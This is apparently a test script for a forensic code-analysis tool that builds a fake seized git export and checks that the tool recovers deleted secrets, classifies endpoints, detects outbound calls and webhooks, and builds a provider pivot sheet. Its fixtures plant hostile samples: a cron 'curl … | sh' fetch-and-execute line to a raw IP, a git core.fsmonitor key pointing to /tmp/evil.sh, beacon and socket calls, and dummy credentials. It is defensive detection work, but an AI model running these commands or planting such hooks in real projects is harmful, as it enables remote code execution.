"""The source-code stage on a small export tree with two git repositories, configuration and code (review-driven):
repositories read without loading the seized config, deleted secrets recovered from history, endpoints classified,
outbound calls (curl/fetch/requests, sockets, mail, shell curl|sh, Telegram/Discord notifies, license/heartbeat checks,
cron fetches, including variable hosts resolved from config), inbound webhook/IPN handlers, per-provider pivot sheet
(what is sent, which credential/account it uses, what that provider holds), configuration database names matched to an
extracted database, and the result searchable as a "code" export.
`python tests/code_check.py` - needs git in PATH; no model, evidence or network."""
import csv, json, os, shutil, subprocess, sys, tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from gumshoe import code as codemod, dbexport, dbexplore, fingerprint  # noqa: E402
from gumshoe.case import Case, load_config  # noqa: E402

ok = True


def check(name, cond, detail=""):
    global ok
    ok = ok and bool(cond)
    print(("  [PASS] " if cond else "  [FAIL] ") + name + (f" - {detail}" if detail and not cond else ""))


def git(repo, *args, env=None):
    e = dict(os.environ, GIT_AUTHOR_DATE=env.get("D") if env else "2026-02-01T10:00:00+0300",
             GIT_COMMITTER_DATE=env.get("D") if env else "2026-02-01T10:00:00+0300",
             GIT_AUTHOR_NAME=(env or {}).get("N", "Dev One"), GIT_AUTHOR_EMAIL=(env or {}).get("E", "dev1@ecopanel.su"),
             GIT_COMMITTER_NAME=(env or {}).get("N", "Dev One"), GIT_COMMITTER_EMAIL=(env or {}).get("E", "dev1@ecopanel.su"),
             GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null")
    subprocess.run(["git", *args], cwd=repo, env=e, check=True, capture_output=True)


if not shutil.which("git"):
    print("git not installed; skipping code_check")
    sys.exit(0)

tmp = Path(tempfile.mkdtemp(prefix="gc-"))
src = tmp / "source_code"
# repo 1: ep — a deleted .env secret, a dangerous config key, a Telegram token in code, an AGENTS.md,
# plus outbound calls (variable-host curl, Telegram notify, SMS file_get_contents, license/heartbeat beacon,
# mail, socket, cron curl|sh, multiline Python f-string requests.post, unconfigured env var call) and
# inbound webhook/IPN handlers (Perfect Money IPN + multi-route Stripe & Telegram controller).
ep = src / "ep"
(ep / "config").mkdir(parents=True)
(ep / "src").mkdir()
(ep / "public").mkdir()
git(ep, "init", "-q", "-b", "main")
git(ep, "remote", "add", "origin", "https://ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@github.com/ecopanel/ep.git")
(ep / ".env").write_text("APP_ENV=prod\nDB_HOST=127.0.0.1\nDB_DATABASE=sw\nDB_USERNAME=app\nDB_PASSWORD=S3cretDbPass!\n"
                         "TELEGRAM_BOT_TOKEN=7111111111:AAHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Abcd\nAFTERSHIP_API_KEY=asat_0123456789abcdef0123456789abcdef\n"
                         "SMS_ACTIVATE_KEY=0123456789abcdef0123456789abcdef\nGATEWAY_HOST=api.stripe.com\nOPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnop\n", "utf-8")
(ep / "AGENTS.md").write_text("# Instructions for the coding agent\nUse Symfony. The bot lives in EcopanelBot.\n", "utf-8")
(ep / "src" / "Bot.php").write_text(
    "<?php\n// talks to Telegram, SMS provider, variable-configured payment gateway, license gate, socket and mail\n"
    "$u='https://api.telegram.org/bot7222222222:BBHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Axyz/sendMessage';\n"
    "$sms='https://api.sms-activate.org/stubs/handler_api.php?action=getNumber&service=tg';\n"
    "$ip='http://185.220.101.5:8080/gate';\n$admin='admin@ecopanel.su';\n"
    "$gw = getenv('GATEWAY_HOST');\n"
    "$ch = curl_init('https://' . env('GATEWAY_HOST', 'fallback.stripe.com') . '/v1/charges');\n"
    "curl_setopt($ch, CURLOPT_POST, 1);\n"
    "curl_setopt($ch, CURLOPT_POSTFIELDS, ['amount' => $amount, 'card_token' => $card]);\n"
    "curl_exec($ch);\n"
    "$res = file_get_contents($sms);\n"
    "$hb = curl_init($ip);\n"
    "curl_setopt($hb, CURLOPT_POSTFIELDS, ['license_key' => $lic, 'domain' => $_SERVER['HTTP_HOST']]);\n"
    "curl_exec($hb);\n"
    "$sock = fsockopen('185.220.101.5', 8080);\n"
    "mail($admin, 'Order notification', $body);\n",
    "utf-8",
)
(ep / "public" / "ipn.php").write_text(
    "<?php\n// Inbound Perfect Money IPN handler\n"
    "$batch = $_POST['PAYMENT_BATCH_NUM'];\n"
    "$payee = $_POST['PAYEE_ACCOUNT'];\n"
    "$amt = $_POST['PAYMENT_AMOUNT'];\n"
    "if ($_POST['V2_HASH'] === $expected) { echo 'OK'; }\n",
    "utf-8",
)
(ep / "src" / "WebhookController.php").write_text(
    "<?php\nclass WebhookController {\n"
    "  #[Route('/webhook/stripe', methods: ['POST'])]\n"
    "  public function stripe() {\n"
    "    $sig = $_SERVER['HTTP_STRIPE_SIGNATURE'] ?? '';\n"
    "    $evt = $_POST['checkout_session_id'];\n"
    "  }\n"
    "  #[Route('/webhook/telegram', methods: ['POST'])]\n"
    "  public function handle() {\n"
    "    $sig = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';\n"
    "    $update = json_decode(file_get_contents('php://input'), true);\n"
    "    $uid = $update['update_id'];\n"
    "    $chatId = $update['message']['chat']['id'] ?? $update['callback_query']['id'];\n"
    "  }\n"
    "}\n",
    "utf-8",
)
(ep / "src" / "sync.py").write_text(
    "import os, requests\n"
    "url = f'https://{os.getenv(\"GATEWAY_HOST\", \"api.stripe.com\")}/v1/customers'\n"
    "requests.post(\n"
    "    url,\n"
    "    json={'email': customer_email, 'plan': plan_id},\n"
    ")\n"
    "requests.get(f'https://{os.getenv(\"UNSET_C2_HOST\")}/ping')\n",
    "utf-8",
)
(ep / "crontab").write_text(
    "*/10 * * * * root curl -fsSL https://185.220.101.5:8080/beacon.sh | sh\n",
    "utf-8",
)
(ep / "composer.json").write_text(json.dumps({"name": "ecopanel/ep", "require": {"symfony/framework-bundle": "^6.4", "aftership/aftership-sdk-php": "^2.0"}}), "utf-8")
(ep / "config" / "services.yaml").write_text("parameters:\n  telegram:\n    token: 7333333333:CCHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Auvw\n  payments:\n    perfect_money: PM-ACCT-1234\n", "utf-8")
git(ep, "add", "-A")
git(ep, "commit", "-q", "-m", "initial import with .env", env={"D": "2026-02-01T10:00:00+0300", "N": "Dev One", "E": "dev1@ecopanel.su"})
# second commit by a second developer in another timezone: remove the committed .env (secret now only in history)
(ep / ".gitignore").write_text(".env\n", "utf-8")
git(ep, "rm", "-q", "--cached", ".env")
git(ep, "add", "-A")
git(ep, "commit", "-q", "-m", "stop tracking .env", env={"D": "2026-02-05T09:30:00-0500", "N": "Vlad Two", "E": "vlad@protonmail.com"})
(ep / ".env").write_text("APP_ENV=prod\nDB_HOST=127.0.0.1\nDB_DATABASE=sw\nDB_USERNAME=app\nDB_PASSWORD=RotatedPass2026!\n"
                         "TELEGRAM_BOT_TOKEN=7111111111:AAHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Abcd\nGATEWAY_HOST=api.stripe.com\n"
                         "AFTERSHIP_API_KEY=asat_0123456789abcdef0123456789abcdef\nOPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnop\n", "utf-8")
# a dangerous local config key, and a reflog entry from a reset
subprocess.run(["git", "config", "core.fsmonitor", "/tmp/evil.sh"], cwd=ep, check=True, capture_output=True,
               env=dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null"))
(ep / "src" / "temp.php").write_text("<?php // scratch\n", "utf-8")
git(ep, "add", "-A")
git(ep, "commit", "-q", "-m", "scratch (will be reset)", env={"D": "2026-02-06T11:00:00-0500", "N": "Vlad Two", "E": "vlad@protonmail.com"})
git(ep, "reset", "-q", "--hard", "HEAD~1")              # the scratch commit is now unreachable / reflog-only

# repo 2: EcopanelBot — just so there are two
bot = src / "EcopanelBot"
(bot).mkdir(parents=True)
git(bot, "init", "-q", "-b", "main")
git(bot, "remote", "add", "origin", "git@github.com:ecopanel/EcopanelBot.git")
(bot / ".env").write_text("BOT_TOKEN=7444444444:DDHfiqksKZ8WmR2zSjiQ7_v4TVAKyXg9w1Arst\nMYSQL_DATABASE=ewmanager\nPROXY=socks5://user:pass@185.100.87.202:9050\n", "utf-8")
(bot / "setup.php").write_text("<?php $db='mysql://bot:pw@127.0.0.1/ewmanager'; $track='https://api.aftership.com/v4/trackings';\n"
                               "$ch=curl_init($track); curl_setopt($ch, CURLOPT_HTTPHEADER, ['as-api-key: ' . getenv('AFTERSHIP_API_KEY')]); curl_exec($ch);\n", "utf-8")
git(bot, "add", "-A")
git(bot, "commit", "-q", "-m", "bot", env={"D": "2026-02-02T12:00:00+0300", "N": "Dev One", "E": "dev1@ecopanel.su"})

# a case whose extracted databases include `sw` and `ewmanager`, so config/export_links matches
cases = tmp / "cases"; cases.mkdir()
case = Case.create(cases, "EP1", "tester", None, str(src), "export", load_config(None))
for dumpname, dbs in (("dump_sw.sql", ["sw"]), ("dumps_ewmanager.sql", ["ewmanager"])):
    d = case.dir / "db" / dbexport.slug(dumpname)
    d.mkdir(parents=True)
    (d / "source.json").write_text(json.dumps({"kind": "mysql-dump", "name": dbexport.slug(dumpname), "out": str(d / "out"),
                                               "tables": [{"database": db, "table": "users", "rows": 1, "files": []} for db in dbs]}), "utf-8")

code = codemod.run(case, log=lambda s: None, root=src)

check("both repositories found", len(code["repos"]) == 2 and {r["name"] for r in code["repos"]} == {"ep", "EcopanelBot"}, str([r["name"] for r in code["repos"]]))
epr = next(r for r in code["repos"] if r["name"] == "ep")
check("ep remote URL read from config", any("github.com/ecopanel/ep" in x["url"] for x in epr["remotes"]), str(epr["remotes"]))
check("the dangerous core.fsmonitor key is reported, and git never ran it", any("core.fsmonitor" in k for k in epr["command_keys"]), str(epr["command_keys"]))
check("AGENTS.md flagged as AI-agent instructions", "AGENTS.md" in epr["agent_files"], str(epr["agent_files"]))
check("the reset scratch commit is reflog-only or unreachable", epr["reflog_only"] >= 1 or epr["unreachable_commits"] >= 1, f"reflog_only={epr['reflog_only']} unreachable={epr['unreachable_commits']}")

out = Path(code["out"])


def rows(db, tbl):
    p = out / dbexport.slug(db) / f"{tbl}.csv"
    with open(p, encoding="utf-8-sig", newline="") as f:
        return list(csv.DictReader(f))


commits = rows("git", "commits")
check("commits carry the author's UTC offset (two timezones seen)", {c["author_tz"] for c in commits} >= {"+03:00", "-05:00"}, str({c["author_tz"] for c in commits}))
authors = rows("git", "authors")
check("two authors, by e-mail", {a["email"] for a in authors} >= {"dev1@ecopanel.su", "vlad@protonmail.com"}, str([a["email"] for a in authors]))
hsec = rows("git", "history_secrets")
check("the deleted DB password is recovered from history and marked not-in-file",
      any(h["key"] == "DB_PASSWORD" and "S3cretDbPass" in h["value"] and h["value_still_in_file"] == "False" for h in hsec), str([(h["key"], h["value_still_in_file"]) for h in hsec]))
check("the removed .env's Telegram token is in history_secrets with the commit that introduced it",
      any(h["service"] == "telegram" and h["introduced_by"] == "dev1@ecopanel.su" and h["introduced_by_commit"] for h in hsec), str([(h.get("service"), h.get("introduced_by")) for h in hsec]))
deleted = rows("git", "deleted")
check(".env recorded as deleted from history", any(d["path"] == ".env" for d in deleted), str([d["path"] for d in deleted]))

eps = rows("code", "endpoints")
by_host = {e["host"]: e for e in eps}
check("Telegram endpoint classified messaging", by_host.get("api.telegram.org", {}).get("class") == "messaging")
check("SMS-activate endpoint classified sms", by_host.get("api.sms-activate.org", {}).get("class") == "sms")
check("AfterShip endpoint classified shipping", by_host.get("api.aftership.com", {}).get("class") == "shipping")
check("variable-resolved host from config (api.stripe.com) added to endpoints", by_host.get("api.stripe.com", {}).get("class") == "payments", str(list(by_host)))
check("public IP:port endpoint kept and classed ip", any(h.startswith("185.220.101.5") for h in by_host) and by_host[next(h for h in by_host if h.startswith('185.220.101.5'))]["class"] == "ip", str(list(by_host)))
check("GitHub is code-hosting, jsdelivr-style CDN would be noise", by_host.get("github.com", {}).get("class") in ("code-hosting", None))

vals = rows("config", "values")
check("live Telegram token found in services.yaml with its nested key", any(v["service"] == "telegram" and "telegram.token" in v["key"] for v in vals), str([v["key"] for v in vals if v["service"] == "telegram"]))
dbrows = rows("config", "databases")
check("database connections parsed (sw and ewmanager)", {d["database"] for d in dbrows} >= {"sw", "ewmanager"}, str([d["database"] for d in dbrows]))
links = rows("config", "export_links")
check("config DB names matched to the extracted exports", {l["database"] for l in links} >= {"sw", "ewmanager"}, str([(l["database"], l["export"]) for l in links]))

# build s: outbound calls, variable hosts, inbound webhooks/IPNs, and per-provider pivot sheet
calls = rows("code", "calls")
check("variable-host curl call resolved GATEWAY_HOST -> api.stripe.com with POST method and payload keys",
      any(c["host"] == "api.stripe.com" and c["method"] == "POST" and "GATEWAY_HOST" in c["resolved_from"] and "amount" in c["payload"] for c in calls),
      str([(c["host"], c["method"], c["resolved_from"], c["payload"]) for c in calls]))
check("file_get_contents call to variable $sms resolved to api.sms-activate.org",
      any(c["host"] == "api.sms-activate.org" and "file_get_contents" in c["mechanism"] for c in calls),
      str([(c["host"], c["mechanism"]) for c in calls]))
check("license / heartbeat beacon call detected with payload fields",
      any("185.220.101.5" in c["host"] and ("license-check" in c["flags"] or "heartbeat" in c["flags"]) and "license_key" in c["payload"] for c in calls),
      str([(c["host"], c["flags"], c["payload"]) for c in calls]))
check("cron curl|sh fetch-and-execute detected",
      any("shell-pipe-exec" in c["flags"] and "cron" in c["flags"] and "*/10 * * * *" in c["payload"] for c in calls),
      str([(c["mechanism"], c["flags"], c["payload"]) for c in calls]))
check("socket (fsockopen) and mail() calls recorded",
      any(c["kind"] == "socket" and "185.220.101.5" in c["host"] for c in calls) and any(c["kind"] == "mail" for c in calls),
      str([(c["kind"], c["mechanism"], c["host"]) for c in calls]))

webhooks = rows("code", "webhooks")
check("inbound Perfect Money IPN handler detected with V2_HASH verification and POST fields",
      any(w["service"] == "perfect money" and "V2_HASH" in w["verification"] and "PAYMENT_BATCH_NUM" in w["payload_fields"] for w in webhooks),
      str([(w["service"], w["verification"], w["payload_fields"]) for w in webhooks]))
check("inbound Telegram bot webhook route /webhook/telegram detected",
      any(w["service"] == "telegram" and w["route_or_script"] == "/webhook/telegram" for w in webhooks),
      str([(w["service"], w["route_or_script"], w["verification"]) for w in webhooks]))

pivots = rows("code", "pivots")
by_prov = {p["provider"]: p for p in pivots}
check("pivot sheet has Telegram with direction=both, bot_ids extracted, credentials and provider_holds",
      "telegram" in by_prov and by_prov["telegram"]["direction"] == "both" and "bot_id:7111111111" in by_prov["telegram"]["accounts_or_ids"]
      and "bot_id:7222222222" in by_prov["telegram"]["accounts_or_ids"] and "webhook" in by_prov["telegram"]["provider_holds"].lower(),
      str(by_prov.get("telegram")))
check("pivot sheet joins historical-only SMS-Activate credential to live outbound call",
      "sms-activate" in by_prov and by_prov["sms-activate"]["history_only"] == "True" and int(by_prov["sms-activate"]["calls_n"]) >= 1
      and "SMS_ACTIVATE_KEY" in by_prov["sms-activate"]["credential_keys"],
      str(by_prov.get("sms-activate")))
check("pivot sheet links Perfect Money account ID PM-ACCT-1234 and inbound IPN handler",
      "perfect money" in by_prov and "PM-ACCT-1234" in by_prov["perfect money"]["accounts_or_ids"] and int(by_prov["perfect money"]["webhooks_n"]) >= 1,
      str(by_prov.get("perfect money")))
check("pivot sheet includes AfterShip with API key, outbound call and what the provider holds",
      "aftership" in by_prov and "AFTERSHIP_API_KEY" in by_prov["aftership"]["credential_keys"] and "tracking" in by_prov["aftership"]["provider_holds"].lower(),
      str(by_prov.get("aftership")))
check("multiline Python f-string requests.post resolved clean URL without f-prefix or braces",
      any(c["file"].endswith("sync.py") and c["url_or_target"] == "https://api.stripe.com/v1/customers" and c["method"] == "POST" for c in calls),
      str([c for c in calls if c["file"].endswith("sync.py")]))
check("unconfigured variable host recorded as (config:UNSET_C2_HOST) in calls without polluting endpoints",
      any(c["host"] == "(config:UNSET_C2_HOST)" for c in calls) and not any("unset_c2" in h.lower() for h in by_host),
      str(([(c["host"], c["url_or_target"]) for c in calls if "UNSET" in c["host"]], list(by_host))))
check("multi-route controller assigns /webhook/stripe and /webhook/telegram to their own handlers without duplicate Telegram rows",
      len([w for w in webhooks if w["file"].endswith("WebhookController.php")]) == 2
      and any(w["service"] == "stripe" and w["route_or_script"] == "/webhook/stripe" for w in webhooks)
      and any(w["service"] == "telegram" and w["route_or_script"] == "/webhook/telegram" for w in webhooks),
      str([w for w in webhooks if w["file"].endswith("WebhookController.php")]))
check("dormant config-only credential (OpenAI) appears in pivots with direction=dormant (config only)",
      by_prov.get("openai", {}).get("direction") == "dormant (config only)" and "OPENAI_API_KEY" in by_prov.get("openai", {}).get("credential_keys", ""),
      str(by_prov.get("openai")))

# the code export is a first-class export: catalog and search see it
cat = dbexplore.catalog(case)
code_tables = {t["table"] for t in cat if t["export"] == code["export"]}
check("the code export is in the Databases-tab catalog (including calls, webhooks, pivots)",
      {"commits", "endpoints", "values", "repositories", "calls", "webhooks", "pivots"} <= code_tables, str(sorted(code_tables)))
hits = dbexplore.search_counts(case, "protonmail", "phrase", cat=cat)
check("searching the case finds the developer's e-mail in the code export", any(h["export"] == code["export"] for h in hits), str(hits))

# fingerprint now treats the dropped repositories as application roots
fp = fingerprint.fingerprint_tree(src, log=lambda s: None, with_composition=False)
app_roots = {a["root"] for a in fp["apps"]}
check("fingerprint found the repositories as application roots", any(r.endswith("/ep") for r in app_roots) and any(r.endswith("/EcopanelBot") for r in app_roots), str(app_roots))
epapp = next((a for a in fp["apps"] if a["root"].endswith("/ep")), None)
check("the app record carries the git remote", epapp and epapp.get("repo", {}).get("remotes"), str(epapp.get("repo") if epapp else None))

# findings
fids = [f for f in case.read_findings() if str(f.get("rule", "")).startswith("code.")]
rules = {f["rule"] for f in fids}
check("findings cover repo, git-config command, history secret, endpoint, database link, shell_fetch_exec, license_or_beacon, variable_host_call, webhook_handler, pivot",
      {"code.repo", "code.git_config_command", "code.history_secret", "code.endpoint_service", "code.database_link",
       "code.shell_fetch_exec", "code.license_or_beacon", "code.variable_host_call", "code.webhook_handler", "code.pivot"} <= rules, str(sorted(rules)))

shutil.rmtree(tmp, ignore_errors=True)
print("code check:", "OK" if ok else "FAILED")
sys.exit(0 if ok else 1)
